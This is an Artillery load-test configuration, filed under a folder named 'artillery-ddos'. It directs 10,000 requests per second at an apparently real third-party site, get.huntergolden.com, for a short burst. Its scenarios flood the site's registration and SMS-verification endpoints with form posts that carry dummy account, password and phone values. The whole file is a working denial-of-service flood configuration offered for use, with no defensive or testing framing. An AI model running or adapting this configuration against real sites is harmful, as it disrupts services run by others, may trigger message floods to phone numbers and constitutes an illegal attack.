artillery-ddos/get.huntergolden.yml
# artillery run artillery-ddos/get.huntergolden.yml
config:
  target: "https://get.huntergolden.com"
  phases:
    - duration: 5
      arrivalRate: 10000
  processor: "./ngrok.js"
scenarios:
  - name: "1"
    flow:
      - function: "generateRandomData"
      - post:
          url: "/?UmcyMDNfMDU3MTAyNDQ5NDY0OGU5&run_page=1"
          form:
            t: "1598078672"
            a: "5e1062f84aabfbda54983cfaef99ea3f"
            sAjax: "./?VGwyMDJfOTRiYWM1NjBkZmRiYTUw&run_page=1"
            nVsType: "0"
            sAjaxKey: "a790bb82de9025d026199e1f3bd7ff45"
            sAccount: "234234"
            sPasswd: "234234"
            sPasswd2: "234234"
            sTransPasswd: "234234"
            sTransPasswd2: "234234"
            sPhone: "0344703832"
            sVsCode: "175"
            sItCode: "bDJ1YnJzX0twSmlxemR1am9jdz0"
            nAgree: "1"
  - name: "2"
    flow:
      - function: "generateRandomData"
      - get:
          url: "/?TG8xMDFfNjc0ZWRlOGNmODVhNTQx&t=1598078183&msg=&redurl=&resend=0"
          # form:
            # txt_username: "{{ name }}"
            # email: "{{ email }}"
            # txt_password: "{{ password }}"
      # - log: "Get with {{ name }}"
  
  - name: "3"
    flow:
      - function: "generateRandomData"
      - post:
          url: "/?VGwyMDJfOTRiYWM1NjBkZmRiYTUw&run_page=1"
          form:
            sPhone: "0344703832"
            sAccount: ""
            nVsType: "0"
            sAjaxKey: "430ac7c23a5d3ab556e77aabcc18f051"
            nT: "1598078954"
            run_page: "1"